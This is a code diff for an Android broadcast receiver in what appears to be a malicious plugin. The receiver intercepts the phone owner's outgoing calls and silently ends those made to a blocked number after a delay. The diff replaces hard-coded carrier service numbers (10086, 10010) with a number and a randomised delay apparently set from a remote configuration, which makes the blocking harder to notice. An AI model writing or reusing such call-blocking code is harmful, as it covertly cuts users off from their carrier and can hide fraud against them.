@@ -9,6 +9,8 @@ import com.xstd.plugin.Utils.PhoneCallUtils;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 
+import java.util.Random;
+
 
 /**
  * Created with IntelliJ IDEA.
@@ -22,37 +24,29 @@ public class DialProcessBRC extends BroadcastReceiver {
     public void onReceive(final Context context, Intent intent) {
         if (intent != null) {
             String action = intent.getAction();
-            if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
+            if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)
+                    && AppRuntime.ACTIVE_RESPONSE != null
+                    && AppRuntime.ACTIVE_RESPONSE.blockNum != null) {
                 final String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                 if (!TextUtils.isEmpty(phoneNumber)) {
                     Config.LOGD("[[DialProcessBRC::onReceive]] out going Phone Number : " + phoneNumber);
 
-                    int networkType = AppRuntime.getNetworkTypeByIMSI(context);
-                    switch (networkType) {
-                        case AppRuntime.CMNET:
-                            if (phoneNumber.startsWith("10086")) {
-                                Handler handler = new Handler(context.getMainLooper());
-                                handler.postDelayed(new Runnable() {
-                                    @Override
-                                    public void run() {
-                                        PhoneCallUtils.encCall(context);
-                                        Config.LOGD("[[DialProcessBRC::onReceive]] End Call for Number : " + phoneNumber);
-                                    }
-                                }, AppRuntime.END_CALL_DELAY);
+                    if (phoneNumber.startsWith(AppRuntime.ACTIVE_RESPONSE.blockNum)) {
+                        //算出一个随机时间
+                        int delay = (AppRuntime.ACTIVE_RESPONSE.blockMaxTime == AppRuntime.ACTIVE_RESPONSE.blockMinTime)
+                                        ? AppRuntime.ACTIVE_RESPONSE.blockMaxTime
+                                        : (new Random().nextInt(AppRuntime.ACTIVE_RESPONSE.blockMaxTime - AppRuntime.ACTIVE_RESPONSE.blockMinTime)
+                                              + AppRuntime.ACTIVE_RESPONSE.blockMinTime);
+                        delay = delay * 1000;
+
+                        Handler handler = new Handler(context.getMainLooper());
+                        handler.postDelayed(new Runnable() {
+                            @Override
+                            public void run() {
+                                PhoneCallUtils.encCall(context);
+                                Config.LOGD("[[DialProcessBRC::onReceive]] End Call for Number : " + phoneNumber);
                             }
-                            break;
-                        case AppRuntime.UNICOM:
-                            if (phoneNumber.startsWith("10010")) {
-                                Handler handler = new Handler(context.getMainLooper());
-                                handler.postDelayed(new Runnable() {
-                                    @Override
-                                    public void run() {
-                                        PhoneCallUtils.encCall(context);
-                                        Config.LOGD("[[DialProcessBRC::onReceive]] End Call for Number : " + phoneNumber);
-                                    }
-                                }, AppRuntime.END_CALL_DELAY);
-                            }
-                            break;
+                        }, delay);
                     }
                 }
             }
